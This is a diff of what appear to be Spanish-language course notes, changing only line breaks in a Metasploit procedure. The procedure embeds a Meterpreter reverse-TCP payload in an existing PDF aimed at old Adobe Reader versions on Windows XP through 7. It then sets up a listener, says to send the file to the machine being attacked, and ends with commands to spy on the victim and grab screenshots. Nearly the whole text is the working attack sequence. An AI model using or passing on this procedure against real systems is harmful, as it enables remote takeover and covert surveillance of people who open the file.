@@ -7,23 +7,23 @@ Explicación: Incrusta una Carga (payload) dentro un archivo PDF existente. El a
 
 Sistema Operativo: Windows XP SP3 (Inglés/Español) / Windows Vista / Windows 7 (Inglés)
 Programas: Adobe Reader v8.x, v9.x
-
-use exploit/windows/fileformat/adobe_pdf_embedded_exe
-set payload windows/meterpreter/reverse_tcp
-ifconfig
-set lhost 10.191.3.4
-set lport 4444
-set infilename /root/parcial/el_gigante_egoista.pdf
-exploit
-
-back
-use exploit/multi/handler
-set lhost 10.191.3.4
-set lport 4444
-exploit
-
-Enviar archivo a la máquina que se desea atacar 
-cuando se tenga el acceso a la máquina atacada se podrá usar todas las herramientas que tiene meterpreter
-
-load espia
+<br />
+use exploit/windows/fileformat/adobe_pdf_embedded_exe <br />
+set payload windows/meterpreter/reverse_tcp <br />
+ifconfig <br />
+set lhost 10.191.3.4 <br />
+set lport 4444 <br />
+set infilename /root/parcial/el_gigante_egoista.pdf <br />
+exploit <br />
+<br />
+back <br />
+use exploit/multi/handler <br />
+set lhost 10.191.3.4 <br />
+set lport 4444 <br />
+exploit <br /> 
+<br />
+Enviar archivo a la máquina que se desea atacar <br />
+cuando se tenga el acceso a la máquina atacada se podrá usar todas las herramientas que tiene meterpreter<br />
+<br />
+load espia<br />
 screengrab
